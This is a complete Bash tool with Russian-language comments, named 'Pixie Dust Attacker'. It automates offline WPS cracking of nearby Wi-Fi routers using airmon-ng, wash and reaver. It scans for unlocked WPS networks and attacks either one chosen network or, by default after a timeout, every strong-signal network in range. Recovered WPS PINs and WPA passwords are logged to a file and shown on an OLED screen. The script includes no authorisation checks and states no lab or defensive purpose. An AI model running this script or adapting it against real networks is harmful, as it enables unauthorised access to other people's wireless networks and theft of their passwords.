#!/bin/bash

# ============================================
# PIXIE DUST ATTACKER - Offline WPS Crack Tool
# Версия: 3.0 | Только Pixie Dust, одна попытка
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ============================================
# НАСТРОЙКИ (ИЗМЕНИТЕ ПОД СЕБЯ)
# ============================================
INTERFACE="wlan0"           # Ваш Wi-Fi интерфейс
CAPTURE_TIME=30             # Время на атаку в секундах
OUTPUT_DIR="pixie_results"  # Директория для результатов
OLED_SCRIPT="/root/oled_display.py"  # Путь к скрипту OLED
FIFO_PATH="/tmp/oled_fifo"
AUTO_TIMEOUT=15             # Секунд до автоматического выбора режима G
# ============================================

MONITOR_INTERFACE=""
TEMP_FILE=""
LOG_FILE="pixie_attack_$(date +%Y%m%d_%H%M%S).log"
OLED_PID=""

# ============================================
# ФУНКЦИИ ВЫВОДА
# ============================================

print_header() {
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}              PIXIE DUST ATTACKER - Offline WPS Crack           ${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}       Только Pixie Dust | 1 попытка на сеть                     ${CYAN}║${NC}"
    echo -e "${CYAN}║${GREEN}       Автовыбор режима G через ${AUTO_TIMEOUT} сек                       ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_info() { echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$LOG_FILE"; }
print_success() { echo -e "${GREEN}[✓]${NC} $1" | tee -a "$LOG_FILE"; }
print_error() { echo -e "${RED}[✗]${NC} $1" | tee -a "$LOG_FILE"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"; }
print_step() { echo -e "${MAGENTA}[→]${NC} $1" | tee -a "$LOG_FILE"; }
print_separator() { echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"; }

# ============================================
# ФУНКЦИИ OLED
# ============================================

oled_send() {
    if [ -p "$FIFO_PATH" ] 2>/dev/null; then
        echo "$1" > "$FIFO_PATH" 2>/dev/null
    fi
}

oled_line1() { oled_send "L1:$1"; }
oled_line2() { oled_send "L2:$1"; }
oled_line3() { oled_send "L3:$1"; }
oled_line4() { oled_send "L4:$1"; }

start_oled() {
    if [ -f "$OLED_SCRIPT" ]; then
        print_step "Запуск OLED дисплея..."
        rm -f "$FIFO_PATH" 2>/dev/null
        python3 "$OLED_SCRIPT" 2>/dev/null &
        OLED_PID=$!
        sleep 2
        if [ -p "$FIFO_PATH" ]; then
            print_success "OLED дисплей запущен"
        else
            print_warning "OLED не отвечает, продолжаем без дисплея"
            OLED_PID=""
        fi
    else
        print_warning "OLED скрипт не найден: $OLED_SCRIPT"
    fi
}

stop_oled() {
    if [ -n "$OLED_PID" ] && kill -0 $OLED_PID 2>/dev/null; then
        oled_line1 "Script ended"
        oled_line2 "Goodbye!"
        sleep 1
        kill $OLED_PID 2>/dev/null
    fi
    rm -f "$FIFO_PATH" 2>/dev/null
}

# ============================================
# ПРОВЕРКА ЗАВИСИМОСТЕЙ
# ============================================

check_dependencies() {
    print_step "Проверка установленных программ..."
    
    local missing=()
    
    if ! command -v reaver &> /dev/null; then
        print_error "reaver не установлен!"
        missing+=("reaver")
    else
        if reaver -h 2>&1 | grep -q "pixie-dust"; then
            print_success "Reaver с поддержкой Pixie Dust"
        else
            print_warning "Стандартный Reaver! Нужна модифицированная версия"
        fi
    fi
    
    if ! command -v airmon-ng &> /dev/null; then
        print_error "airmon-ng не установлен!"
        missing+=("aircrack-ng")
    else
        print_success "airmon-ng установлен"
    fi
    
    if ! command -v wash &> /dev/null; then
        print_error "wash не установлен!"
        missing+=("wash")
    else
        print_success "wash установлен"
    fi
    
    if [ ${#missing[@]} -ne 0 ]; then
        print_error "Отсутствуют зависимости: ${missing[*]}"
        echo "Установка: sudo apt install reaver aircrack-ng -y"
        exit 1
    fi
    
    mkdir -p "$OUTPUT_DIR"
    print_success "Результаты в: $OUTPUT_DIR"
}

# ============================================
# РЕЖИМ МОНИТОРА
# ============================================

enable_monitor_mode() {
    sudo airmon-ng check kill &>/dev/null
    sudo airmon-ng start "$INTERFACE" &>/dev/null
    sleep 3
    
    if iwconfig 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
    elif ip link show "${INTERFACE}mon" &>/dev/null 2>&1; then
        MONITOR_INTERFACE="${INTERFACE}mon"
    else
        MONITOR_INTERFACE="mon0"
    fi
}

disable_monitor_mode() {
    sudo airmon-ng stop "$MONITOR_INTERFACE" &>/dev/null
    sudo systemctl restart NetworkManager &>/dev/null
    sleep 2
}

# ============================================
# ПРОВЕРКА - УЖЕ ВЗЛОМАНА ЛИ СЕТЬ
# ============================================

is_already_cracked() {
    local bssid=$1
    local cracked_file="$OUTPUT_DIR/cracked_passwords.txt"
    if [ -f "$cracked_file" ] && grep -q "$bssid" "$cracked_file" 2>/dev/null; then
        return 0
    fi
    return 1
}

# ============================================
# ПОИСК СЕТЕЙ
# ============================================

find_wps_networks() {
    print_step "Поиск WPS сетей с незаблокированным WPS (Locked=No)..."
    oled_line1 "Scanning WPS..."
    oled_line2 "Please wait 25s"
    
    TEMP_FILE="/tmp/wps_targets.txt"
    > "$TEMP_FILE"
    
    enable_monitor_mode
    print_info "Сканирование 25 секунд..."
    echo ""
    printf "  %-18s %-6s %-8s %-30s\n" "BSSID" "Канал" "Сигнал" "ESSID"
    echo "  ────────────────────────────────────────────────────────────────"
    
    sudo timeout 25 wash -i "$MONITOR_INTERFACE" --scan 2>/dev/null | while read line; do
        if echo "$line" | grep -qE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}.*No"; then
            bssid=$(echo "$line" | awk '{print $1}')
            channel=$(echo "$line" | awk '{print $2}')
            rssi=$(echo "$line" | awk '{print $3}')
            essid=$(echo "$line" | awk '{print $NF}')
            [ -z "$essid" ] || [ "$essid" == "(null)" ] && essid="<Hidden>"
            
            printf "  ${GREEN}✓${NC} ${CYAN}%-18s${NC} %-6s %-8s %-30s\n" "$bssid" "$channel" "$rssi" "$essid"
            echo "$bssid|$channel|$rssi|$essid" >> "$TEMP_FILE"
        fi
    done
    
    echo ""
    disable_monitor_mode
    
    if [ ! -s "$TEMP_FILE" ]; then
        print_error "Не найдено ни одной сети с Locked=No"
        oled_line1 "No WPS networks"
        return 1
    fi
    
    local cnt=$(wc -l < "$TEMP_FILE")
    print_success "Найдено $cnt сетей"
    oled_line1 "Ready! $cnt targets"
    oled_line2 ""
    return 0
}

# ============================================
# ВЫБОР ЦЕЛИ (с автотаймаутом)
# ============================================

select_target() {
    echo ""
    print_separator
    echo -e "${WHITE}                    ВЫБОР ЦЕЛИ ДЛЯ АТАКИ                        ${NC}"
    print_separator
    echo ""
    
    local i=1
    declare -a bssids
    declare -a essids
    
    printf "  %-4s %-18s %-30s\n" "№" "BSSID" "ESSID (сигнал)"
    echo "  ────────────────────────────────────────────────────────────────"
    
    while IFS='|' read -r bssid channel rssi essid; do
        printf "  ${GREEN}[%2d]${NC} ${CYAN}%-18s${NC} %-30s\n" "$i" "$bssid" "$essid ($rssi)"
        bssids[$i]="$bssid"
        essids[$i]="$essid"
        ((i++))
    done < "$TEMP_FILE"
    
    local max_choice=$((i-1))
    
    echo ""
    echo -e "  ${GREEN}[A]${NC} - Все сети | ${GREEN}[G]${NC} - Только хороший сигнал | ${GREEN}[0]${NC} - Выход"
    echo -e "  ${YELLOW}Автовыбор G через ${AUTO_TIMEOUT} сек...${NC}"
    echo ""
    
    local choice=""
    for ((t=$AUTO_TIMEOUT; t>0; t--)); do
        echo -ne "\r  Осталось: ${t} сек -> " >&2
        if read -t 1 choice 2>/dev/null; then
            break
        fi
    done
    echo "" >&2
    
    if [ -z "$choice" ]; then
        echo ""; print_warning "Таймаут! Выбран режим G (хороший сигнал)"
        AUTO_MODE=1; SELECTED_MODE="good"
        oled_line1 "Mode: Good signal"
        return 0
    fi
    
    case "$choice" in
        0) return 1 ;;
        [aA]) AUTO_MODE=1; SELECTED_MODE="all"; print_info "Режим: все сети"; return 0 ;;
        [gG]) AUTO_MODE=1; SELECTED_MODE="good"; print_info "Режим: хороший сигнал"; return 0 ;;
        *)
            if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "$max_choice" ]; then
                SELECTED_BSSID="${bssids[$choice]}"
                SELECTED_ESSID="${essids[$choice]}"
                AUTO_MODE=0
                print_info "Выбрана сеть #$choice: $SELECTED_ESSID"
                oled_line1 "Target: $SELECTED_ESSID"
                return 0
            else
                print_error "Неверный выбор"
                select_target
                return $?
            fi
            ;;
    esac
}

# ============================================
# PIXIE DUST АТАКА (одна попытка)
# ============================================

pixie_attack() {
    local bssid=$1
    local essid=$2
    local current=$3
    local total=$4
    
    # Проверка на уже взломанную
    if is_already_cracked "$bssid"; then
        print_warning "Сеть $essid уже взломана! Пропускаем."
        oled_line1 "[$current/$total] SKIPPED"
        oled_line2 "$essid"
        oled_line3 "Already cracked"
        sleep 2
        return 2
    fi
    
    echo ""
    print_separator
    echo -e "${WHITE}                      PIXIE DUST АТАКА                            ${NC}"
    print_separator
    echo -e "  ${GREEN}BSSID:${NC} $bssid"
    echo -e "  ${GREEN}ESSID:${NC} $essid"
    echo ""
    
    if [ "$total" -gt 1 ]; then
        oled_line1 "[$current/$total] Cracking..."
    else
        oled_line1 "Cracking..."
    fi
    oled_line2 "$essid"
    oled_line3 "Pixie Dust..."
    oled_line4 ""
    
    enable_monitor_mode
    
    echo ""
    print_separator
    echo -e "${WHITE}                     REAVER OUTPUT                              ${NC}"
    print_separator
    echo ""
    
    local output_file="/tmp/reaver_${bssid//:/_}.txt"
    sudo timeout "$CAPTURE_TIME" reaver -i "$MONITOR_INTERFACE" -b "$bssid" -K -vv 2>&1 | tee "$output_file"
    
    disable_monitor_mode
    
    # Проверка результата
    if grep -qi "PIN found" "$output_file" 2>/dev/null; then
        local pin=$(grep -i "PIN found" "$output_file" | head -1 | awk '{print $NF}')
        local password=""
        
        if grep -qi "WPA PSK" "$output_file" 2>/dev/null; then
            password=$(grep -i "WPA PSK" "$output_file" | head -1 | awk '{print $NF}')
        fi
        
        print_success "УСПЕХ!"
        [ -n "$pin" ] && echo -e "  ${GREEN}PIN:${NC} $pin"
        [ -n "$password" ] && echo -e "  ${GREEN}ПАРОЛЬ:${NC} $password"
        
        # Сохраняем результат
        if [ -n "$pin" ] || [ -n "$password" ]; then
            echo "$(date) | $bssid | $essid | PIN: ${pin:-N/A} | PASS: ${password:-N/A}" >> "$OUTPUT_DIR/cracked_passwords.txt"
            echo "BSSID: $bssid" > "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
            echo "ESSID: $essid" >> "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
            [ -n "$pin" ] && echo "PIN: $pin" >> "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
            [ -n "$password" ] && echo "PASSWORD: $password" >> "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
            echo "Date: $(date)" >> "$OUTPUT_DIR/$(echo $bssid | tr ':' '_').txt"
        fi
        
        # Обновляем OLED
        if [ "$total" -gt 1 ]; then
            oled_line1 "[$current/$total] CRACKED!"
        else
            oled_line1 "CRACKED!"
        fi
        [ -n "$pin" ] && oled_line3 "PIN: $pin"
        [ -n "$password" ] && oled_line4 "PASS: ${password:0:18}"
        sleep 3
        return 0
    fi
    
    # Не уязвим
    print_error "Роутер не уязвим к Pixie Dust"
    if [ "$total" -gt 1 ]; then
        oled_line1 "[$current/$total] FAILED"
    else
        oled_line1 "FAILED"
    fi
    oled_line3 "Not vulnerable"
    sleep 2
    return 1
}

# ============================================
# ОЧИСТКА ПРИ ВЫХОДЕ
# ============================================

cleanup() {
    echo ""
    print_warning "Прерывание работы..."
    stop_oled
    rm -f /tmp/wps_targets.txt /tmp/wps_targets.txt.sorted /tmp/reaver_*.txt 2>/dev/null
    exit 0
}

# ============================================
# ОСНОВНАЯ ФУНКЦИЯ
# ============================================

main() {
    # Парсинг аргументов командной строки
    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--interface)
                INTERFACE="$2"
                shift 2
                ;;
            -t|--timeout)
                CAPTURE_TIME="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -h|--help)
                echo "Использование: sudo ./pixie_attacker.sh [ОПЦИИ]"
                echo ""
                echo "ОПЦИИ:"
                echo "  -i, --interface <iface>    Wi-Fi интерфейс (по умолчанию: wlan0)"
                echo "  -t, --timeout <сек>        Время на атаку (по умолчанию: 30)"
                echo "  -o, --output <дир>         Директория для результатов (по умолчанию: pixie_results)"
                echo "  -h, --help                 Показать справку"
                echo ""
                echo "Примеры:"
                echo "  sudo ./pixie_attacker.sh"
                echo "  sudo ./pixie_attacker.sh -i wlan1"
                echo "  sudo ./pixie_attacker.sh -t 45 -o my_results"
                exit 0
                ;;
            *)
                print_error "Неизвестная опция: $1"
                exit 1
                ;;
        esac
    done
    
    # Проверка прав root
    if [ "$EUID" -ne 0 ]; then
        print_error "Скрипт должен запускаться с правами root"
        echo "Используйте: sudo $0"
        exit 1
    fi
    
    # Установка обработчиков сигналов
    trap cleanup SIGINT SIGTERM
    
    # Заголовок
    print_header
    
    # Запуск OLED
    start_oled
    
    # Проверка зависимостей
    check_dependencies
    
    # Поиск сетей
    if ! find_wps_networks; then
        stop_oled
        exit 1
    fi
    
    # Выбор цели
    if ! select_target; then
        print_info "Выход"
        stop_oled
        exit 0
    fi
    
    # Атака
    if [ $AUTO_MODE -eq 1 ]; then
        local success_count=0
        local skipped_count=0
        local total=0
        declare -a targets_list
        
        # Сортируем по сигналу (от лучшего к худшему)
        sort -t'|' -k3 -n "$TEMP_FILE" > "${TEMP_FILE}.sorted"
        
        while IFS='|' read -r bssid channel rssi essid; do
            if [ "$SELECTED_MODE" == "good" ]; then
                sig_num=$(echo "$rssi" | sed 's/-//g')
                if [ $sig_num -gt 65 ]; then
                    print_warning "Пропускаем $bssid (слабый сигнал $rssi)"
                    continue
                fi
            fi
            targets_list+=("$bssid|$essid")
        done < "${TEMP_FILE}.sorted"
        
        total=${#targets_list[@]}
        
        if [ $total -eq 0 ]; then
            print_error "Нет целей для атаки"
            stop_oled
            exit 1
        fi
        
        for i in "${!targets_list[@]}"; do
            current=$((i+1))
            bssid=$(echo "${targets_list[$i]}" | cut -d'|' -f1)
            essid=$(echo "${targets_list[$i]}" | cut -d'|' -f2)
            
            echo ""
            echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
            echo -e "${WHITE}  Атака сети $current из $total${NC}"
            echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
            
            pixie_attack "$bssid" "$essid" "$current" "$total"
            local result=$?
            
            if [ $result -eq 0 ]; then
                ((success_count++))
            elif [ $result -eq 2 ]; then
                ((skipped_count++))
            fi
            
            if [ $current -lt $total ]; then
                sleep 2
            fi
        done
        
        echo ""
        print_separator
        print_success "Успешно взломано: $success_count из $total (пропущено уже взломанных: $skipped_count)"
        oled_line1 "COMPLETE!"
        oled_line2 "Cracked: $success_count/$total"
        oled_line3 "Passwords saved"
        sleep 3
        
    else
        # Атака выбранной сети
        pixie_attack "$SELECTED_BSSID" "$SELECTED_ESSID" "1" "1"
    fi
    
    # Очистка
    stop_oled
    rm -f /tmp/wps_targets.txt /tmp/wps_targets.txt.sorted /tmp/reaver_*.txt 2>/dev/null
    
    echo ""
    print_separator
    print_success "Работа скрипта завершена"
    print_success "Результаты сохранены в: $OUTPUT_DIR"
    echo ""
}

# Запуск
main "$@"
